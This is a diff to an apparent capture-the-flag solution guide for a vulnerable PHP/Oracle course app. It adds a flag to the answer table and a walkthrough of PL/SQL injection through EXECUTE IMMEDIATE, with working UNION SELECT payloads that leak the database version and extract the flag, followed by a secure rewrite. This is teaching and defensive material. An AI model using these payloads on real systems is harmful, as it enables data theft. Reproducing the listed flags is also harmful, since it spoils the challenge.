@@ -13,6 +13,9 @@
 | **Flag 1** | Oracle UNION SQL Injection | `DBS401{SQL_1nj3ct10n_0r4cl3!}` | `search.php` (Fragmented: `FLAGS`, `AUDIT_LOGS`, `CONFIG_STORE`) |
 | **Flag 2** | Insecure Business Logic (Negative Qty) | `DBS401{LOGIC_GURU_2024}` | `store.php` (Exam Leak Item, > 999,999 Credits) |
 | **Flag 3** | Access Control & Supply Chain Poisoning | `DBS401{5upp1y_Ch41n_P0150n1ng_0912}` | `partner_config.php` + `admin.php?check_updates=1` |
+| **Flag 4** | Oracle PL/SQL Injection (EXECUTE IMMEDIATE) | `DBS401{PL5QL_1nj3ct10n_D3f1n3r}` | `course_lookup.php` → `FN_COURSE_LOOKUP` → `PLSQL_VAULT` |
+
+> With `RANDOMIZE_FLAGS=1` every instance generates its own flag values; the table above lists the default (static) flags only.
 
 ---
 
@@ -398,6 +401,96 @@ if (!in_array($inputUrl, $allowedManifestDomains, true)) {
     die("Validation Error: Manifest URL origin is not in the approved repository allowlist.");
 }
 ```
+
+---
+
+## ═══════════════════════════════════════════════
+## VULNERABILITY 4 – Oracle PL/SQL Injection (EXECUTE IMMEDIATE)
+## ═══════════════════════════════════════════════
+
+**Flag:** `DBS401{PL5QL_1nj3ct10n_D3f1n3r}` (default; randomized when `RANDOMIZE_FLAGS=1`)
+**Endpoint:** `course_lookup.php` → stored function `FN_COURSE_LOOKUP` → `PLSQL_VAULT`
+
+### The subtlety
+
+`course_lookup.php` passes the course code as a **bind variable**:
+
+```php
+$sql  = "SELECT FN_COURSE_LOOKUP(:code) AS info FROM DUAL";
+oci_bind_by_name($stmt, ':code', $code);   // looks safe...
+```
+
+…but the stored function concatenates that value into dynamic SQL:
+
+```sql
+v_sql := 'SELECT course_name FROM COURSES WHERE course_code = ''' || p_code || '''';
+EXECUTE IMMEDIATE v_sql INTO v_result;     -- ...injection happens HERE
+```
+
+So parameterizing at the PHP boundary does **not** help — the flaw is in the
+server-side PL/SQL. This is the key Oracle-specific lesson of the challenge.
+
+### Step 1 – Confirm injection
+
+Normal use returns a course name:
+
+```
+course_lookup.php?code=DBS401        →  "Database Security"
+```
+
+Break out of the string literal to trigger a different code path:
+
+```
+course_lookup.php?code=DBS401' --    →  still resolves (comment swallows the trailing quote)
+course_lookup.php?code=zzz' UNION SELECT banner FROM v$version--   → version string leaks
+```
+
+### Step 2 – Mind the single-row constraint and the decoy
+
+The function uses `... INTO v_result`, so the final query must return **exactly
+one row**. `PLSQL_VAULT` contains a `CHALLENGE_4` row and a `DECOY` row, so the
+naive payload returns two rows and the function reports `TOO_MANY_ROWS`:
+
+```
+code=zzz' UNION SELECT secret_flag FROM PLSQL_VAULT--
+  → "Ambiguous result (more than one row)."
+```
+
+### Step 3 – Extract Flag 4
+
+Filter to the single real row:
+
+```
+code=zzz' UNION SELECT secret_flag FROM PLSQL_VAULT WHERE label='CHALLENGE_4'--
+```
+
+The "Course Name" field now shows **Flag 4**. (Enumerate labels first with
+`... UNION SELECT label FROM PLSQL_VAULT WHERE ROWNUM=1--` if needed.)
+
+### Remediation & Patch
+
+Fix the stored program, not just the call site — see
+[`secure_versions/course_lookup_secure.php`](../secure_versions/course_lookup_secure.php):
+
+```sql
+-- Preferred: static SQL, no dynamic query built from user input
+CREATE OR REPLACE FUNCTION FN_COURSE_LOOKUP_SECURE(p_code IN VARCHAR2)
+  RETURN VARCHAR2 AS
+  v_result VARCHAR2(4000);
+BEGIN
+  SELECT course_name INTO v_result FROM COURSES WHERE course_code = p_code;
+  RETURN v_result;
+EXCEPTION WHEN NO_DATA_FOUND THEN RETURN 'No course found for that code.';
+END;
+/
+
+-- If dynamic SQL is unavoidable, BIND the value, never concatenate:
+--   EXECUTE IMMEDIATE 'SELECT course_name FROM COURSES WHERE course_code = :c'
+--     INTO v_result USING p_code;
+```
+
+Also run the function with **invoker's rights** (`AUTHID CURRENT_USER`) and keep
+the web role unable to read `PLSQL_VAULT` directly.
 
 ---
 
